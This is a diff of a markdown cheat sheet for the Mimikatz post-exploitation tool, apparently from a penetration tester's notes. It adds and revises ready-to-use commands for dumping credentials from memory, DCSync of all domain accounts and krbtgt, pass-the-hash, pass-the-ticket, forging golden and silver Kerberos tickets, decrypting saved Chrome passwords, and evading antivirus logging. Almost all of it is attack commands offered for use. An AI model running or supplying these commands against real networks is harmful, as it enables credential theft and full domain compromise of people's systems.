@@ -2,6 +2,8 @@
 title = "Mimikatz"
 +++
 
+- Ref: https://tools.thehacker.recipes/mimikatz/modules
+
 Mimikatz is a post-exploitation tool that can extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory. It can also perform pass-the-hash, pass-the-ticket, and build Golden Tickets.
 
 ## Important Notes
@@ -29,6 +31,9 @@ token::elevate
 
 # Write to console in bae64 (avoid AV flagging)
 base64 /out:true
+
+# Write output to a logfile (flagged by AV!)
+log <LOGFILE>.txt 
 ```
 
 ## Credential Dumping
@@ -61,7 +66,7 @@ sekurlsa::tickets /export
 **Extract AES Keys:**
 ```bash
 # Extract AES Keys for Pass the Key attacks
-.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
+sekurlsa::ekeys
 ```
 
 ### SAM Database
@@ -84,18 +89,21 @@ lsadump::lsa /patch
 lsadump::lsa /inject /name:krbtgt
 ```
 
-**DCSync (Remote):**
-```bash
-# Remotely dump account from Domain Controller
-lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
-```
-
 ## DCSync
 
 Might require `runas`.
 
 ```bash
-mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USER>" exit
+# Specific user
+lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\<USER>
+
+# For KRBTGT
+lsadump::dcsync /domain:<DOMAIN> /user:<DOMAIN>\krbtgt
+
+# All users
+# WARNING: takes a long time... write output to a file!
+log dc_sync.txt
+lsadump::dcsync /domain:<DOMAIN> /all
 ```
 
 ## Pass the Hash (PtH)
@@ -105,7 +113,7 @@ Pass the Hash allows you to authenticate using an NTLM hash instead of a plainte
 ```bash
 # Use "." for domain if targeting local machine
 # IMPORTANT: Run commands inside the NEW window that pops up
-mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /ntlm:<PASS_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
+sekurlsa::pth /user:<USER> /ntlm:<PASS_HASH> /domain:<DOMAIN> /run:cmd.exe
 ```
 
 **Alternative Syntax:**
@@ -119,7 +127,7 @@ sekurlsa::pth /domain:<DOMAIN> /user:<USER> /ntlm:<HASH> /run:cmd.exe
 
 **Extract AES Keys First:**
 ```bash
-.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
+sekurlsa::ekeys
 ```
 
 **Pass the Key with AES:**
@@ -136,18 +144,22 @@ Pass the Ticket allows you to use stolen Kerberos tickets to authenticate as ano
 **Export Tickets:**
 ```bash
 # Export tickets from memory to .kirbi files
-.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
+sekurlsa::tickets /export
 ```
 
 **Inject Ticket:**
 ```bash
 # Inject ticket into current session
-.\mimikatz.exe "kerberos::ptt <TICKET_FILE.kirbi>" "misc::cmd" exit
+kerberos::ptt <TICKET_FILE.kirbi>
+misc::cmd
+exit
 ```
 
-## Golden Ticket Attack
+## Golden & Silver Ticket Attack
 
-A Golden Ticket is a forged Kerberos TGT that allows you to impersonate any user in the domain, including domain administrators.
+A **Golden Ticket** is a forged Kerberos TGT that allows you to impersonate any user in the domain, including domain administrators.
+
+A **Silver Ticket** is a forged Kerberos TGS that allows you to impersonate any user on a single machine.
 
 ### Step 1: Get KRBTGT Hash & SID
 
@@ -163,16 +175,28 @@ lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
 
 ### Step 2: Create & Inject Ticket
 
+- `/ptt` - This flag tells Mimikatz to inject the ticket directly into the session, meaning it is ready to be used.
+- `/endin` - The ticket lifetime. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 10 hours (600 minutes)  
+- `/renewmax` - The maximum ticket lifetime with renewal. By default, Mimikatz generates a ticket that is valid for 10 years. The default Kerberos policy of AD is 7 days (10080 minutes)
+- `/user`: can use any value including non-existent users
+
 ```bash
-# /ptt immediately injects it into memory. /id:500 makes you fake-admin.
-kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM> /id:500 /ptt
+# GOLDEN TICKET
+kerberos::golden /ptt /id:500 /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<NTLM>
+
+# SILVER TICKET
+kerberos::golden /ptt /id:500 /user:Administrator /domain:<DOMAIN> /sid:<SID> /service:cifs /target:<MACHINE_FQDN> /rc4:<MACHINE_HASH> 
 ```
 
 ### Step 3: Launch Shell
 
 ```bash
-# Launch shell (Optional, or just use current shell if /ptt was used)
-misc::cmd
+# OPTIONAL: Launch shell or exit and use the current shell since /ptt was used
+misc::cmd  # this only works via RDP
+exit
+
+# Verify ticket is working by reading DC share
+dir \\<DC_FQDN>\c$\
 ```
 
 ## Credential Manager
@@ -180,8 +204,6 @@ misc::cmd
 Dump credentials stored in Windows Credential Manager:
 
 ```bash
-\\tsclient\share\mimikatz.exe
-privilege::debug
 sekurlsa::credman
 ```
 
@@ -190,6 +212,5 @@ sekurlsa::credman
 Decrypt data protected by Windows DPAPI, such as browser credentials:
 
 ```bash
-mimikatz.exe
 dpapi::chrome /in:"C:\Users\<USER>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
